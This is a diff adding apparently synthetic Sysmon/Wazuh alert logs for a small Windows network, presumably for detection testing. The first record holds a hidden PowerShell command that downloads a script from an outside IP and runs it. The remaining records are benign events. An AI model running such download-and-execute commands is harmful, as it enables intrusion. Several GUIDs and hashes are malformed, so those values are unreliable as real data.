@@ -1,0 +1,624 @@
+[
+{
+  "agent": {
+    "ip": "172.17.101.54",
+    "name": "WORKSTATION-DEV-01",
+    "id": "002",
+    "labels": {
+      "SINGLE_AGENT": "4.7.5.2"
+    }
+  },
+  "manager": {
+    "name": "ip-172-31-17-51"
+  },
+  "data": {
+    "win": {
+      "eventdata": {
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "commandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://185.243.115.89/script.ps1')\"",
+        "currentDirectory": "C:\\Users\\jdoe\\Documents\\",
+        "processGuid": "{593f6a87-ab12-6841-7f23-000000002100}",
+        "processId": "3847",
+        "parentProcessGuid": "{593f6a87-cd34-6841-5a12-000000002100}",
+        "parentProcessId": "2156",
+        "parentImage": "C:\\Windows\\System32\\cmd.exe",
+        "utcTime": "2025-05-28 14:22:45.234",
+        "ruleName": "technique_id=T1059.001,technique_name=PowerShell",
+        "user": "WORKSTATION-DEV-01\\jdoe"
+      },
+      "system": {
+        "eventID": "1",
+        "keywords": "0x8000000000000000",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "level": "4",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "opcode": "0",
+        "message": "Process creation:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-05-28 14:22:45.234\r\nProcessGuid: {593f6a87-ab12-6841-7f23-000000002100}\r\nProcessId: 3847",
+        "version": "5",
+        "systemTime": "2025-05-28T14:22:45.2456789Z",
+        "eventRecordID": "29661233",
+        "threadID": "4566",
+        "computer": "WORKSTATION-DEV-01",
+        "task": "1",
+        "processID": "3328",
+        "severityValue": "INFORMATION",
+        "providerName": "Microsoft-Windows-Sysmon"
+      }
+    }
+  },
+  "rule": {
+    "firedtimes": 1,
+    "mail": false,
+    "level": 8,
+    "description": "PowerShell process created with suspicious command line parameters",
+    "groups": ["sysmon", "sysmon_eid1", "windows", "powershell"],
+    "mitre": {
+      "technique": ["PowerShell"],
+      "id": ["T1059.001"],
+      "tactic": ["Execution"]
+    },
+    "id": "92001"
+  },
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "input": {
+    "type": "log"
+  },
+  "@timestamp": "2025-05-28T14:22:47.456Z",
+  "location": "EventChannel",
+  "id": "1748445367.11234566",
+  "timestamp": "2025-05-28T14:22:47.456+0000"
+},
+{
+  "agent": {
+    "ip": "172.17.101.54",
+    "name": "WORKSTATION-DEV-01",
+    "id": "002",
+    "labels": {
+      "SINGLE_AGENT": "4.7.5.2"
+    }
+  },
+  "manager": {
+    "name": "ip-172-31-17-51"
+  },
+  "data": {
+    "win": {
+      "eventdata": {
+        "destinationPort": "80",
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "sourcePort": "62341",
+        "initiated": "true",
+        "destinationIp": "185.243.115.89",
+        "protocol": "tcp",
+        "processGuid": "{593f6a87-ab12-6841-7f23-000000002100}",
+        "sourceIp": "172.17.101.54",
+        "processId": "3847",
+        "utcTime": "2025-05-28 14:23:02.156",
+        "ruleName": "technique_id=T1071.001,technique_name=Web Protocols",
+        "destinationIsIpv6": "false",
+        "user": "WORKSTATION-DEV-01\\jdoe",
+        "sourceIsIpv6": "false"
+      },
+      "system": {
+        "eventID": "3",
+        "keywords": "0x8000000000000000",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "level": "4",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "opcode": "0",
+        "message": "Network connection detected:\r\nRuleName: technique_id=T1071.001,technique_name=Web Protocols\r\nUtcTime: 2025-05-28 14:23:02.156\r\nProcessGuid: {593f6a87-ab12-6841-7f23-000000002100}\r\nProcessId: 3847\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "version": "5",
+        "systemTime": "2025-05-28T14:23:02.1678901Z",
+        "eventRecordID": "29661235",
+        "threadID": "4568",
+        "computer": "WORKSTATION-DEV-01",
+        "task": "3",
+        "processID": "3328",
+        "severityValue": "INFORMATION",
+        "providerName": "Microsoft-Windows-Sysmon"
+      }
+    }
+  },
+  "rule": {
+    "firedtimes": 1,
+    "mail": true,
+    "level": 10,
+    "description": "Suspicious network connection to known malicious IP by PowerShell process",
+    "groups": ["sysmon", "sysmon_event3", "windows", "threat_intel"],
+    "id": "61723"
+  },
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "input": {
+    "type": "log"
+  },
+  "@timestamp": "2025-05-28T14:23:04.234Z",
+  "location": "EventChannel",
+  "id": "1748445384.11234568",
+  "timestamp": "2025-05-28T14:23:04.234+0000"
+},
+{
+  "agent": {
+    "ip": "172.17.101.55",
+    "name": "LAPTOP-SALES-03",
+    "id": "003",
+    "labels": {
+      "SINGLE_AGENT": "4.7.5.2"
+    }
+  },
+  "manager": {
+    "name": "ip-172-31-17-51"
+  },
+  "data": {
+    "win": {
+      "eventdata": {
+        "destinationPort": "443",
+        "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "sourcePort": "58392",
+        "initiated": "true",
+        "destinationIp": "142.250.191.78",
+        "protocol": "tcp",
+        "processGuid": "{593f6a87-ef56-6841-9b45-000000003200}",
+        "sourceIp": "172.17.101.55",
+        "processId": "4521",
+        "utcTime": "2025-05-28 14:25:12.789",
+        "destinationIsIpv6": "false",
+        "user": "LAPTOP-SALES-03\\msmith",
+        "sourceIsIpv6": "false"
+      },
+      "system": {
+        "eventID": "3",
+        "keywords": "0x8000000000000000",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "level": "4",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "opcode": "0",
+        "message": "Network connection detected:\r\nUtcTime: 2025-05-28 14:25:12.789\r\nProcessGuid: {593f6a87-ef56-6841-9b45-000000003200}\r\nProcessId: 4521\r\nImage: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "version": "5",
+        "systemTime": "2025-05-28T14:25:12.7891234Z",
+        "eventRecordID": "29661278",
+        "threadID": "4789",
+        "computer": "LAPTOP-SALES-03",
+        "task": "3",
+        "processID": "3328",
+        "severityValue": "INFORMATION",
+        "providerName": "Microsoft-Windows-Sysmon"
+      }
+    }
+  },
+  "rule": {
+    "firedtimes": 156,
+    "mail": false,
+    "level": 2,
+    "description": "Normal HTTPS browsing activity",
+    "groups": ["sysmon", "sysmon_event3", "windows"],
+    "id": "61001"
+  },
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "input": {
+    "type": "log"
+  },
+  "@timestamp": "2025-05-28T14:25:14.123Z",
+  "location": "EventChannel",
+  "id": "1748445514.11234789",
+  "timestamp": "2025-05-28T14:25:14.123+0000"
+},
+{
+  "agent": {
+    "ip": "172.17.101.53",
+    "name": "DESKTOP-T060MPC",
+    "id": "001",
+    "labels": {
+      "SINGLE_AGENT": "4.7.5.2"
+    }
+  },
+  "manager": {
+    "name": "ip-172-31-17-51"
+  },
+  "data": {
+    "win": {
+      "eventdata": {
+        "destinationPort": "443",
+        "image": "C:\\Windows\\System32\\svchost.exe",
+        "sourcePort": "59876",
+        "initiated": "true",
+        "destinationIp": "13.107.42.14",
+        "protocol": "tcp",
+        "processGuid": "{593f6a87-1234-6824-ab12-000000001f00}",
+        "sourceIp": "172.17.101.53",
+        "processId": "1845",
+        "utcTime": "2025-05-28 14:18:33.442",
+        "destinationIsIpv6": "false",
+        "user": "NT AUTHORITY\\NETWORK SERVICE",
+        "sourceIsIpv6": "false"
+      },
+      "system": {
+        "eventID": "3",
+        "keywords": "0x8000000000000000",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "level": "4",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "opcode": "0",
+        "message": "Network connection detected:\r\nUtcTime: 2025-05-28 14:18:33.442\r\nProcessGuid: {593f6a87-1234-6824-ab12-000000001f00}\r\nProcessId: 1845\r\nImage: C:\\Windows\\System32\\svchost.exe",
+        "version": "5",
+        "systemTime": "2025-05-28T14:18:33.4421567Z",
+        "eventRecordID": "29661145",
+        "threadID": "3421",
+        "computer": "DESKTOP-T060MPC",
+        "task": "3",
+        "processID": "3328",
+        "severityValue": "INFORMATION",
+        "providerName": "Microsoft-Windows-Sysmon"
+      }
+    }
+  },
+  "rule": {
+    "firedtimes": 23,
+    "mail": false,
+    "level": 1,
+    "description": "Windows Update service network activity",
+    "groups": ["sysmon", "sysmon_event3", "windows", "system_services"],
+    "id": "61010"
+  },
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "input": {
+    "type": "log"
+  },
+  "@timestamp": "2025-05-28T14:18:35.567Z",
+  "location": "EventChannel",
+  "id": "1748445115.11223344",
+  "timestamp": "2025-05-28T14:18:35.567+0000"
+},
+{
+  "agent": {
+    "ip": "172.17.101.61",
+    "name": "SERVER-FILE-01",
+    "id": "007",
+    "labels": {
+      "SINGLE_AGENT": "4.7.5.2"
+    }
+  },
+  "manager": {
+    "name": "ip-172-31-17-51"
+  },
+  "data": {
+    "win": {
+      "eventdata": {
+        "originalFileName": "notepad.exe",
+        "image": "C:\\Windows\\System32\\notepad.exe",
+        "product": "Microsoft® Windows® Operating System",
+        "signature": "Microsoft Windows",
+        "imageLoaded": "C:\\Windows\\System32\\shell32.dll",
+        "description": "Windows Shell Common Dll",
+        "signed": "true",
+        "signatureStatus": "Valid",
+        "processGuid": "{593f6a87-gh78-6841-cd56-000000004300}",
+        "processId": "5642",
+        "utcTime": "2025-05-28 13:45:21.123",
+        "hashes": "SHA1=E4F7A9B2C5D8E1F4A7B0C3D6E9F2A5B8C1D4E7F0,MD5=F5A8B1C4D7E0F3A6B9C2D5E8F1A4B7C0,SHA256=A6B9C2D5E8F1A4B7C0D3E6F9A2B5C8D1E4F7A0B3C6D9E2F5A8B1C4D7E0F3A6B9,IMPHASH=B7C0D3E6F9A2B5C8D1E4F7A0B3C6D9E2",
+        "company": "Microsoft Corporation",
+        "fileVersion": "10.0.19041.3636",
+        "user": "SERVER-FILE-01\\administrator"
+      },
+      "system": {
+        "eventID": "7",
+        "keywords": "0x8000000000000000",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "level": "4",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "opcode": "0",
+        "message": "Image loaded:\r\nUtcTime: 2025-05-28 13:45:21.123\r\nProcessGuid: {593f6a87-gh78-6841-cd56-000000004300}\r\nProcessId: 5642\r\nImage: C:\\Windows\\System32\\notepad.exe\r\nImageLoaded: C:\\Windows\\System32\\shell32.dll",
+        "version": "3",
+        "systemTime": "2025-05-28T13:45:21.1234567Z",
+        "eventRecordID": "29660987",
+        "threadID": "5123",
+        "computer": "SERVER-FILE-01",
+        "task": "7",
+        "processID": "3328",
+        "severityValue": "INFORMATION",
+        "providerName": "Microsoft-Windows-Sysmon"
+      }
+    }
+  },
+  "rule": {
+    "firedtimes": 1,
+    "mail": false,
+    "level": 1,
+    "description": "Normal application DLL loading",
+    "groups": ["sysmon", "sysmon_eid7", "windows"],
+    "id": "92001"
+  },
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "input": {
+    "type": "log"
+  },
+  "@timestamp": "2025-05-28T13:45:23.234Z",
+  "location": "EventChannel",
+  "id": "1748443123.11223456",
+  "timestamp": "2025-05-28T13:45:23.234+0000"
+},
+{
+  "agent": {
+    "ip": "172.17.101.56",
+    "name": "WORKSTATION-HR-02",
+    "id": "004",
+    "labels": {
+      "SINGLE_AGENT": "4.7.5.2"
+    }
+  },
+  "manager": {
+    "name": "ip-172-31-17-51"
+  },
+  "data": {
+    "win": {
+      "eventdata": {
+        "destinationPort": "443",
+        "image": "C:\\Program Files\\Windows Defender\\MpCmdRun.exe",
+        "sourcePort": "61234",
+        "initiated": "true",
+        "destinationIp": "40.76.4.15",
+        "protocol": "tcp",
+        "processGuid": "{593f6a87-ij90-6841-ef78-000000005400}",
+        "sourceIp": "172.17.101.56",
+        "processId": "6789",
+        "utcTime": "2025-05-28 15:10:45.678",
+        "destinationIsIpv6": "false",
+        "user": "NT AUTHORITY\\SYSTEM",
+        "sourceIsIpv6": "false"
+      },
+      "system": {
+        "eventID": "3",
+        "keywords": "0x8000000000000000",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "level": "4",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "opcode": "0",
+        "message": "Network connection detected:\r\nUtcTime: 2025-05-28 15:10:45.678\r\nProcessGuid: {593f6a87-ij90-6841-ef78-000000005400}\r\nProcessId: 6789\r\nImage: C:\\Program Files\\Windows Defender\\MpCmdRun.exe",
+        "version": "5",
+        "systemTime": "2025-05-28T15:10:45.6789012Z",
+        "eventRecordID": "29661456",
+        "threadID": "6789",
+        "computer": "WORKSTATION-HR-02",
+        "task": "3",
+        "processID": "3328",
+        "severityValue": "INFORMATION",
+        "providerName": "Microsoft-Windows-Sysmon"
+      }
+    }
+  },
+  "rule": {
+    "firedtimes": 5,
+    "mail": false,
+    "level": 2,
+    "description": "Windows Defender signature update connection",
+    "groups": ["sysmon", "sysmon_event3", "windows", "antivirus"],
+    "id": "61045"
+  },
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "input": {
+    "type": "log"
+  },
+  "@timestamp": "2025-05-28T15:10:47.789Z",
+  "location": "EventChannel",
+  "id": "1748448247.11234567",
+  "timestamp": "2025-05-28T15:10:47.789+0000"
+},
+{
+  "agent": {
+    "ip": "172.17.101.57",
+    "name": "LAPTOP-FINANCE-01",
+    "id": "005",
+    "labels": {
+      "SINGLE_AGENT": "4.7.5.2"
+    }
+  },
+  "manager": {
+    "name": "ip-172-31-17-51"
+  },
+  "data": {
+    "win": {
+      "eventdata": {
+        "originalFileName": "winword.exe",
+        "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "product": "Microsoft Office",
+        "signature": "Microsoft Corporation",
+        "imageLoaded": "C:\\Program Files\\Microsoft Office\\root\\Office16\\mso.dll",
+        "description": "Microsoft Office component",
+        "signed": "true",
+        "signatureStatus": "Valid",
+        "processGuid": "{593f6a87-kl12-6841-gh90-000000006500}",
+        "processId": "7890",
+        "utcTime": "2025-05-28 16:15:32.456",
+        "hashes": "SHA1=C6D9E2F5A8B1C4D7E0F3A6B9C2D5E8F1,MD5=D7E0F3A6B9C2D5E8F1A4B7C0D3E6F9A2,SHA256=E8F1A4B7C0D3E6F9A2B5C8D1E4F7A0B3C6D9E2F5A8B1C4D7E0F3A6B9C2D5E8F1,IMPHASH=F9A2B5C8D1E4F7A0B3C6D9E2F5A8B1C4",
+        "company": "Microsoft Corporation",
+        "fileVersion": "16.0.14326.20404",
+        "user": "LAPTOP-FINANCE-01\\jjohnson"
+      },
+      "system": {
+        "eventID": "7",
+        "keywords": "0x8000000000000000",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "level": "4",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "opcode": "0",
+        "message": "Image loaded:\r\nUtcTime: 2025-05-28 16:15:32.456\r\nProcessGuid: {593f6a87-kl12-6841-gh90-000000006500}\r\nProcessId: 7890\r\nImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\r\nImageLoaded: C:\\Program Files\\Microsoft Office\\root\\Office16\\mso.dll",
+        "version": "3",
+        "systemTime": "2025-05-28T16:15:32.4567890Z",
+        "eventRecordID": "29661678",
+        "threadID": "7890",
+        "computer": "LAPTOP-FINANCE-01",
+        "task": "7",
+        "processID": "3328",
+        "severityValue": "INFORMATION",
+        "providerName": "Microsoft-Windows-Sysmon"
+      }
+    }
+  },
+  "rule": {
+    "firedtimes": 1,
+    "mail": false,
+    "level": 1,
+    "description": "Microsoft Office application loading",
+    "groups": ["sysmon", "sysmon_eid7", "windows", "office"],
+    "id": "92078"
+  },
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "input": {
+    "type": "log"
+  },
+  "@timestamp": "2025-05-28T16:15:34.567Z",
+  "location": "EventChannel",
+  "id": "1748451334.11234890",
+  "timestamp": "2025-05-28T16:15:34.567+0000"
+},
+{
+  "agent": {
+    "ip": "172.17.101.58",
+    "name": "DESKTOP-MARKETING-01",
+    "id": "006",
+    "labels": {
+      "SINGLE_AGENT": "4.7.5.2"
+    }
+  },
+  "manager": {
+    "name": "ip-172-31-17-51"
+  },
+  "data": {
+    "win": {
+      "eventdata": {
+        "destinationPort": "53",
+        "image": "C:\\Windows\\System32\\svchost.exe",
+        "sourcePort": "62345",
+        "initiated": "true",
+        "destinationIp": "8.8.8.8",
+        "protocol": "udp",
+        "processGuid": "{593f6a87-mn34-6841-ij12-000000007600}",
+        "sourceIp": "172.17.101.58",
+        "processId": "1234",
+        "utcTime": "2025-05-28 11:30:15.789",
+        "destinationIsIpv6": "false",
+        "user": "NT AUTHORITY\\NETWORK SERVICE",
+        "sourceIsIpv6": "false"
+      },
+      "system": {
+        "eventID": "3",
+        "keywords": "0x8000000000000000",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "level": "4",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "opcode": "0",
+        "message": "Network connection detected:\r\nUtcTime: 2025-05-28 11:30:15.789\r\nProcessGuid: {593f6a87-mn34-6841-ij12-000000007600}\r\nProcessId: 1234\r\nImage: C:\\Windows\\System32\\svchost.exe",
+        "version": "5",
+        "systemTime": "2025-05-28T11:30:15.7890123Z",
+        "eventRecordID": "29660345",
+        "threadID": "1234",
+        "computer": "DESKTOP-MARKETING-01",
+        "task": "3",
+        "processID": "3328",
+        "severityValue": "INFORMATION",
+        "providerName": "Microsoft-Windows-Sysmon"
+      }
+    }
+  },
+  "rule": {
+    "firedtimes": 89,
+    "mail": false,
+    "level": 1,
+    "description": "Normal DNS query to public resolver",
+    "groups": ["sysmon", "sysmon_event3", "windows", "dns"],
+    "id": "61020"
+  },
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "input": {
+    "type": "log"
+  },
+  "@timestamp": "2025-05-28T11:30:17.890Z",
+  "location": "EventChannel",
+  "id": "1748434217.11220123",
+  "timestamp": "2025-05-28T11:30:17.890+0000"
+},
+{
+  "agent": {
+    "ip": "172.17.101.59",
+    "name": "SERVER-WEB-02",
+    "id": "008",
+    "labels": {
+      "SINGLE_AGENT": "4.7.5.2"
+    }
+  },
+  "manager": {
+    "name": "ip-172-31-17-51"
+  },
+  "data": {
+    "win": {
+      "eventdata": {
+        "originalFileName": "services.exe",
+        "image": "C:\\Windows\\System32\\services.exe",
+        "product": "Microsoft® Windows® Operating System",
+        "signature": "Microsoft Windows",
+        "imageLoaded": "C:\\Windows\\System32\\advapi32.dll",
+        "description": "Advanced Windows 32 Base API",
+        "signed": "true",
+        "signatureStatus": "Valid",
+        "processGuid": "{593f6a87-op56-6841-kl34-000000008700}",
+        "processId": "456",
+        "utcTime": "2025-05-28 10:00:05.123",
+        "hashes": "SHA1=A0B3C6D9E2F5A8B1C4D7E0F3A6B9C2D5,MD5=B1C4D7E0F3A6B9C2D5E8F1A4B7C0D3E6,SHA256=C2D5E8F1A4B7C0D3E6F9A2B5C8D1E4F7A0B3C6D9E2F5A8B1C4D7E0F3A6B9C2D5,IMPHASH=D3E6F9A2B5C8D1E4F7A0B3C6D9E2F5A8",
+        "company": "Microsoft Corporation",
+        "fileVersion": "10.0.19041.3636",
+        "user": "NT AUTHORITY\\SYSTEM"
+      },
+      "system": {
+        "eventID": "7",
+        "keywords": "0x8000000000000000",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "level": "4",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "opcode": "0",
+        "message": "Image loaded:\r\nUtcTime: 2025-05-28 10:00:05.123\r\nProcessGuid: {593f6a87-op56-6841-kl34-000000008700}\r\nProcessId: 456\r\nImage: C:\\Windows\\System32\\services.exe\r\nImageLoaded: C:\\Windows\\System32\\advapi32.dll",
+        "version": "3",
+        "systemTime": "2025-05-28T10:00:05.1234567Z",
+        "eventRecordID": "29659123",
+        "threadID": "456",
+        "computer": "SERVER-WEB-02",
+        "task": "7",
+        "processID": "3328",
+        "severityValue": "INFORMATION",
+        "providerName": "Microsoft-Windows-Sysmon"
+      }
+    }
+  },
+  "rule": {
+    "firedtimes": 1,
+    "mail": false,
+    "level": 1,
+    "description": "System services loading core Windows DLLs",
+    "groups": ["sysmon", "sysmon_eid7", "windows", "system"],
+    "id": "92002"
+  },
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "input": {
+    "type": "log"
+  },
+  "@timestamp": "2025-05-28T10:00:07.234Z",
+  "location": "EventChannel",
+  "id": "1748429207.11210456",
+  "timestamp": "2025-05-28T10:00:07.234+0000"
+}
+]
